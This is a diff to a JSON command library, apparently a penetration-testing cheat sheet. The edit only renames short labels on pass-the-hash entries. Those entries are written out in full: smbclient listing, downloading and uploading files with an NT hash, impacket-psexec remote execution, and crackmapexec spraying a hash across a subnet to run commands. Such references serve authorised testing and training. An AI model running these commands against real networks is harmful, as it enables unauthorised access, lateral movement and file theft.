@@ -17,17 +17,17 @@
     {
       "command": "smbclient \\\\\\\\<target>\\\\<share> -U <domain>/<user> --pw-nt-hash <nt_hash> -c 'ls'",
       "caption": "Non-interactive: list share contents",
-      "label": "smbclient \\\\\\\\<target>\\\\<share> -U…"
+      "label": "smbclient (hash) - list"
     },
     {
       "command": "smbclient \\\\\\\\<target>\\\\<share> -U <user> --pw-nt-hash <nt_hash> -c 'get <file>'",
       "caption": "Download a specific file",
-      "label": "smbclient \\\\\\\\<target>\\\\<share> -U…"
+      "label": "smbclient (hash) - download"
     },
     {
       "command": "smbclient \\\\\\\\<target>\\\\<share> -U <user> --pw-nt-hash <nt_hash> -c 'put <local_file> <remote_file>'",
       "caption": "Upload a file to the share",
-      "label": "smbclient \\\\\\\\<target>\\\\<share> -U…"
+      "label": "smbclient (hash) - upload"
     },
     {
       "command": "impacket-psexec -hashes :<nt_hash> <user>@<target>",
@@ -42,12 +42,12 @@
     {
       "command": "crackmapexec smb <target> -u <user> -H <nt_hash> --shares",
       "caption": "CrackMapExec PTH: enumerate all accessible shares",
-      "label": "crackmapexec"
+      "label": "cme (hash) - enum shares"
     },
     {
       "command": "crackmapexec smb <cidr> -u <user> -H <nt_hash> -x 'whoami'",
       "caption": "CrackMapExec PTH: spray hash across subnet and run command",
-      "label": "crackmapexec"
+      "label": "cme (hash) - exec on CIDR"
     }
   ],
   "examples": [
